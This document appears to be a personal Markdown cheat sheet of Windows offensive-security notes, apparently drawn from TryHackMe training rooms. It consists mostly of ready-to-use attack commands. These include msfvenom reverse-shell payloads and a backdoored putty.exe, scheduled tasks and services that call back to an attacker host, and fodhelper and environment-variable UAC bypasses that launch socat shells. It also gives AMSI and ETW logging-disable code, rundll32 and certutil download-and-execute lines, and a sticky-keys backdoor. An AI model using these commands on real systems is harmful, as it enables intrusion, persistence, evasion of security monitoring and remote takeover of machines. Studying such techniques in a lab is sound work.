- [Sysinternals](#sysinternals)
  - [Abusing Internals](#abusing-internals)
- [Commands](#commands)
  - [Stabilize / Post Exploit / Persistance windows](#stabilize--post-exploit--persistance-windows)
    - [Tampering with low users](#tampering-with-low-users)
    - [Backdoor](#backdoor)
    - [Create/Modfiy Services](#createmodfiy-services)
    - [Schedule Tasks](#schedule-tasks)
    - [Logon as Trigger](#logon-as-trigger)
    - [Login Screen](#login-screen)
    - [Web shell | mssql](#web-shell--mssql)
  - [Powershell](#powershell)
    - [Enumeration](#enumeration)
- [SMB](#smb)
- [RDP](#rdp)
- [Bypass User Account Control (UAC)](#bypass-user-account-control-uac)
  - [GUI bypass](#gui-bypass)
  - [Auto Elevating](#auto-elevating)
  - [Enviroment Variable](#enviroment-variable)
- [Runtime Detection](#runtime-detection)
- [Evade Logging](#evade-logging)
- [Living Off the Land](#living-off-the-land)
  - [File Operation](#file-operation)
    - [Certutil](#certutil)
    - [BITSAdmin](#bitsadmin)
    - [FindStr](#findstr)
    - [Execution](#execution)
- [Bypass Applocker](#bypass-applocker)

# Sysinternals
- [THM Sysinternals](https://tryhackme.com/room/btsysinternalssg)
- [LOLBAS](https://lolbas-project.github.io/#)
- Process analyser
  - Procmon, Process Explorer, Process Hacker 2
- DLL
  - library with code and data shared by programs
  - modularization of code
  - code reuse
  - better memory usage
  - Dependency ==> target of hijacking/injection
  - Load?
    - *load-time dynamic*: calls to the dll (with header and import)
    - *run-time dynamic link*: separte function 
  
- PE = Portable Executable
  - .exe files

- Internals
  - Win64 API
  - interaction with memory
  - user x kernel mode ==> API call = Switching Point

- ASLR = Address Space Layout Randomization 

## Abusing Internals
- [Abusing Internals](https://tryhackme.com/room/abusingwindowsinternals)
- Basic steps
  - Open process
  - Allocate memory
  - write malicious code
  
- Injector
- hollowing - unmapping process
- Hijacking
- DLL
- Invoke function pointers
- Asynchronous procedure calls
- Section manipulation

- [Malware hook](https://www.sentinelone.com/labs/how-trickbot-malware-hooking-engine-targets-windows-10-browsers/)


# Commands
- systeminof
  - part of Active Directory (workgroup / domain)
- wmic = Windows Management Instrumentation Command-line
  - wmic qfe get Caption, Description = updates
  - wmic product get name,version,vendor
  - wmic service where "name like 'name'" get Name,Version,Pathname
  - **wmic** find users || dir /p datei.txt (find file) = find file
  - wmic /namespace:\\root\securitycenter2 path antivirusproduct (workstation) = find AV
  - - wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
    - find services not in folder c:\windows
    - find services without quotation marks
    - account for the service: sc qc SERVICE_NAME ==>local syste?

- Find 
  - get-Process -Name
  - Get-CimInstance
  - Get-Servive WinDefend
  - Get-MpComputerStatus
  - get-Netfirewallprofile
  - get-ChildItem -Hidden -Path C:\Users\NANE
    - Force
    - Recurse
    - Error
  - Test-NetConnection 

- Get-CimInstance
  - Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct (workstantion)
- Get-Servive WinDefend
- Get-MpComputerStatus
- get-Netfirewallprofile
- Test-NetConnection 
- net start = started services

- Firewalls
  - get-Netfirewallprofile | Format-table
  - set-netFirewallprofile -Profile NAME,nAME,NAMe, -enables Flase
  - | select Displayname, Enables, Description
  - get-netfirewallrulle | select Fields
  - get-MpThreat: findings by Denfender
  - Open Ports:
    - netsh advfirewall firewall add rule name="ALLOW TCP PORT 80" dir=in action=allow protocol=TCP localport=80
    - netsh advfirewall firewall show rule name="ALLOW TCP PORT 80"
  
- whoami 
  - /priv
  - /groups

- net 
  - user
  - group
  - localgroup [administrators]
  - accounts /domain
  - share

- ipconfig
  - /all

- netstat
  - -a all
  - -b binary connection
  - -n not resolving ip
  - -o PID
  - -l = listening
  - -t = tcp
  - -u = udp
  - -x = unix
  - -p = process id
  - find open ports

- Test Connection
  - Test-NetConnection / TCPClient
  - Test-NetConnection -ComputerName IP -Port

- get-EventLog -List
- sysmon: logger
  - get-Process | Where-Object  { $_.ProcessName -eq "Sysmon" }
  - Get-CimInstance win32_service -Filter "Description = 'System Monitor Service'"
  - Get-Service | where-object {$_.DisplayName -like "*sysm*"}
  - Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
  - reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
  - findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*

- Services
  - wmic product get name,version
    - wmic service where "name like 'name'" get Name,Version,Pathname
  - get-ChildItem -Hidden -Path C:\Users\NANE
    - -Force
    - -Recurse
    - -Path
    - -Include *.EXtension*
    - -File
    - -ErrocAction
  - get-Process
    - -Name
  - netstat -noa
  - net start
  - nslookup

- findstr = grep
- Windows: get file 
  - powershell -c Invoke-Webrequest -OutFile winPeas.bat http://10.9.1.255/winPEAS.bat
  - powershell -c "(new-object System.Net.WebClient).Downloadfile('https://10.9.1.255:80/PowerUp.ps1', 'C:\Users\fela.CORP\Downloads\PowerUp.ps1')"
  - powershell -c wget "https://10.9.1.255:80/PowerUp.ps1" -outfile "PowerUp.ps1"
  - **certutil** -urlcache -f http://10.9.1.255:80/nc.exe nc.exe

- check permision
  - powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list" ==> if fullcontroll = vuln

- powershell.exe

- Enumerate
  -  setspn -T medin -Q ​ */* 
- Invoke Kereberosast script:
  - iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
  
## Stabilize / Post Exploit / Persistance windows
### Tampering with low users
- Create user + add group admin
  - **net user USERNAME PASS /add**
  - **net localgroup {Administrators/"Backup Operators"| "Remote Management Users" | "Remote Desktop Users"} Username /add**
  
- User Account Control
  - Less privilege when logged in remotly
  -  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

- Assign BACKUP OPERATOR groups
  - secedit /export /cfg config.inf
    - SeBackupPrivilege
    - SeRestorePrivilege
    - secedit /import /cfg config.inf /db config.sdb
    - secedit /configure /db config.sdb /cfg config.inf

- Allow winRM
  - Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI

- Change registry values
  - defauld admin RID = 500
  - Regular users RID >= 1000 ==> Find hex
  - wmic useraccount get name,sid
  - PsExec64.exe -i -s regedit
  - In: HKLM\SAM\SAM\Domains\Account\Users\
    - Change in F to value of admin in HEX(little endian)

### Backdoor
- find executables and "batizar"
  - msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=10.11.26.251 lport=4444 -b "\x00" -f exe -o puttyX.exe
- shortcut
  - point the shortcut to payload

- File association
  - HKLM\Software\Classes ==> reference to standard program = script to be loaded

### Create/Modfiy Services
- **Create**
  - sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
  - sc.exe start THMservice
  - create service with msfvenom:
    - msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
  
- **Modify**
  - sc.exe query state=all
    - sc.exe qc ServiceName
  - Important:
    - binary path name
    - start_type (auto)
    - start name (better localsystem)
    - lsmsfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
  - upload and edit:
    - sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
    - sc.exe qc THMservice3

### Schedule Tasks
- schtasks
  - schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
- Hidding the task
  - remove Security Descriptor
    - HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
  -  PsExec64.exe -s -i regedit
  -  Delete task

### Logon as Trigger
- **Executable on startup**
  - Folder User: AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
  - Folge ALL: ProgramData\Windows\Start Menu\Programs\Startup

- **RunOnce**
  - Force run via registry
    - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    - HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    - HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    - HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
  - HKCU = current user
  - HKLM = All users
  - Run = logon
  - RunOnce = singletime
  - Create registry entry
    - REG_EXPAND_SZ in HKLM\Software\Microsoft\Windows\CurrentVersion\Run
  
- **WinLogn**
  - Executed after authentication
  - HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
  - Userinit ==> userinit.exe = user profile preferences

- **Logon Scripts**
  - Only for current user
  - Variable: UserInitMprLogonScript
  - Assign logon script to user
  - HKCU\Environment ==> add Reg_Expand_Sy

### Login Screen
- Sticky keys
  - 5 x shift = C:\Windows\System32\sethc.exe
  - take ownershipf of file + give permision + overwrite sethc,exe
    - takeown /f c:\Windows\System32\sethc.exe
    - icalcs c:\Windows\System32\sethc.exe /grant Administrator:F

- Utilman (patched)
  - Ease access 
  - c:\Windows\System32\sethc.exe

### Web shell | mssql
- web shell to web directory
- default web server: iis apppool\defaultapppool


## Powershell
- .NET framkework: software plattform für windows
- Commands = cmdlets
  - Verb-Noum
  - Get
  - Start
  - Stop
  - Read
  - Write
  - New
  - Out
- Get-Help [cmdlet] = display info
- Get-Command
  - Verb-*
  - *-Npin
  - New.*
  
- Pipelines |
  - objects are passed
  - Verb-Noum | get-Member => Info about cmdled, object (properties and methods)
    - -MemberType Method/Property/ScriptProperty
  
- Properties
  - COMMAND | Get-Member -MemberType Methody,Property,Other

- Manipulate
  - Select-Object -Property
  - Where-Object => grep
    - -Property PropertyName -operator Value
    -  {$_.PropertyName -operator Value}
       -  -Property Status -eq Running
    -  -operator
       -  -Contains
       -  -EQ
       -  -GT
 - Sort-Object
- Find FIle
  - Get-ChildItem -Recurse -Path "C:\" | Where-Object {$_.Name -match 'interesting*'}
    - -Recurse
    - -Force
    - -Hidden
    - -Path
    - -ErrorAction
    - -Include "\*.EXT\*"
  - Select-String 
    -  -Pattern API_KEY
  
- Measure-Object = count
- Base64
  - certutil.exe -decode INPUT_FILE OUTPUT_FILE
  - Encode: 
    - $Input = Textblablabla
    - $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
    - $EncodedText =[Convert]::ToBase64String($Bytes)
    - $EncodedText
  - Decode
    - $ENCODED = Get-Content -Path "C:\Users\Administrator\Desktop\b64.txt"  
  -  $DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
  
### Enumeration
- COMMAND | get-member
- Get-LocalUser = show users
  - Where-Object {$_.SID -match 'S-1-5-21-1394777289-3961777894-1791813945-501'}
  - Get-LocalUser | Select-Object -Property Name,Enabled,SID
  - Get-LocalUser | Where-Object {$_.PasswordRequired -match 'False' } | measure-object
  
- Get-Localgroup
- Network
  - get-NetIPAddress
  - Get-NetTCPConnection 
  - Test-NetConnection
  - Invoke-WebRequest
- Patches
  - Get-HotFix
- Scheduled-Task
  - Get-ScheduledTask
- Owner
  - Get-Acl

# SMB
- Server Message BLock
- share of files on the network
- Commands
  - smbclient -L \\IP => find shares
  - smbclient \\\\IP\\SHARENAME = open share
    - smbclient -U username \\\\IP\\SHARENAME =
  - get ==> download file
- Scripts
  - smb-enum*
  - smb-vuln*

- Transfer files
  - smbclient -U USER '//IP/folder'
  - put file.name

# RDP
- Basic login
  - xfreerdp /f /u:USERNAME /p:PASSWORD /v:HOST[:PORT]

- Mount local folder:
  - xfreerdp /u:admin /p:password /cert:ignore /v:10.10.134.246 /workarea /drive:/home/bruno/git/tomnt +drives 

# Bypass User Account Control (UAC)
- New Process are runned as non-privileged-account
- Tokens
  - Normal user: 1
  - Admin: filtered (norma actions) + elevated (admin actions)
- Bypass ==> goint to elevated to IL (integrity level) high
- References
- [UAC git repository](https://github.com/hfiref0x/UACME)
- [Bypassing UAC](https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/)
- [Way around UAC](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html)


[**Automated bypass**](https://github.com/hfiref0x/UACME)

## GUI bypass
- **msconfig** RUNS with IL high
    - shell from msconfing = high
- **azman.msc** ==> help ==> view source = open ==> all files

## Auto Elevating
- manifest ==> autoElevate (on/off)
- Change default programm execution in HKEY_Current_USer
  
```
# Define standard application
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command

# Link the application to attacker programm
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.11.26.251:4444 EXEC:cmd.exe,pipes"

# Make the system used our choue
reg add %REG_KEY% /v "DelegateExecute" /d "" /f

# Add the created command as preference
reg add %REG_KEY% /d %CMD% /f

# execute fodhelper.exe

### After Windows Defender

set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command

set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.11.26.251:4444 EXEC:cmd.exe,pipes"

reg add %REG_KEY% /v "DelegateExecute" /d "" /f

# Set command + Query = register delete, windows defender did not act so quickly
reg add %REG_KEY% /d %CMD% /f & reg query %REG_KEY% & fodhelper.exe

# Clean Steps
reg delete HKCU\Software\Classes\ms-settings\ /f
```

- Variations use other registry keys
```
# Powershell
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:10.11.26.251:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force

Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force

Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

# CMD
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.11.26.251:4445 EXEC:cmd.exe,pipes"

reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f

reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f

# Clean Steps:
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f

```

## Enviroment Variable
- Task scheduler
- Rewrite Variable %windir% ==> HKCU\Environment
  - Add at the end = "&REM " = comment everything that exist after the variable name
```
# Payload to be executed instead of normal scheduled task
cmd.exe /c C:\tools\socat\socat.exe TCP:10.11.26.251:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%

# Adding the new registry
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:10.11.26.251:4446 EXEC:cmd.exe,pipes &REM " /f

schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I

# Cleanup new entries
reg delete "HKCU\Environment" /v "windir" /f
```

# Runtime Detection
- Scan code before execution
  - directly from memory
- CRL = Common Language Runtime
- DLR = Dynamic Language Runtime
- [Amsi Fail](http://amsi.fail/)

- How
  - Donwgrade powershell
  - Powershell -Version 2
  
```
https://github.com/trustedsec/unicorn

full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
```

- **Reflection**
```
# Reflection to modify and bypass AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 1 - use assembly from Ref.Assembly
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')

# 2 - obtain .net assembly for PSEtwLogProvider, piped from the previous part of the command
.GetField('amsiInitFailed','NonPublic,Static')

# 3 - set field m_enabled do previous stored value
.SetValue($null,$true)
```

# Evade Logging

- Methodology
  - disable logging (1)
  - keep integrity (2)
  - clear logs (3)

- Logs are forwarded from endpoints to central device
- just deleting them may raise alerts
- Append to a .ps1 script

- **Check amount registered log entries - (2)**
```
Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count

# Check Event Viewer
Microsoft/Windows/PowerShell/Operational 
```

- **Reflection - (1)**
```
# obtain .net assembly for PSEtwLogProvider
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')

# store null value for etwProvider
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)

# set field m_enabled do previous sotred value
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
```

 **Group Policy Takeover**
```
# Reflection to obtaim SM and identify GPO
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)

# modify event provider to 4104 to 0  
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0

# 4103
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
```

- **Disable Logging in ps session**
  - Append to script OR execute in session
  - Avoid sending logs to the pipeline

```
# Get target module
$module = Get-Module Microsoft.PowerShell.Utility 

# module execution details = false
$module.LogPipelineExecutionDetails = $false

# Get target ps-snapin
$snap = Get-PSSnapin Microsoft.PowerShell.Core

# Set ps-snapin execution details to false
$snap.LogPipelineExecutionDetails = $false
```

# Living Off the Land
- Using and abusing of what exists
- How
  - Reconnaissance
  - Files operations
  - Arbitrary code execution
  - Lateral movement
  - Security product bypass

## File Operation

### Certutil
- certification services
- dump + diplay certfication authority
- Ingress tool transfer
- Download
  - certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
- Encode / Decode
  - certutil -encode payload.exe Encoded-payload.txt
  - certutil -decode Encoded_file payload.txt

### BITSAdmin
- create,download, upload Background Intelligente Transfer Service (BITS = files from http and smb servers)
- bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe

### FindStr
- grep
- used to download from SMB
  - findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe

### Execution
- Indirect command execution
- **File Explorer**
  - explorer.exe /root,"C:\Windows\System32\calc.exe"
- 
- **WMIC**
  - wmic.exe process call create calc
  
- **Rundll32**
  -  rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
  -  rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";alert(123)
  -  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");

- **Regsvr32**
  - system32 = 32 bit
  - SysWOW64 = 64 bits
  - Execute binaries + bypass whitelistening
  - Steps
    1. create malicious dll: msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll
    2. upload the file
    3. run it: regserv32.exe c:\path\to\file
    4. regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll 
       1. /s = silent
       2. /n = not call DLL register server
       3. /i = Use another server
       4. /u = run unregistered

- **WSL**
  - bash.exe -c "c:/path/to/file"

- **Shortcuts**
  - Target: rundll32, Powershell, Regsvr32.
  - [Atomic-red-team-T1023](https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md)

- **No Powershell**
  - [PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell.git)
  - msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
  - python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
  - c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj

# Bypass Applocker
- Applocker: restrict programs from being executed
- Windows 7 default
  - whitelisted directory
    - C:\Windows\System32\spool\drivers\color
- Windows history:
  - %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
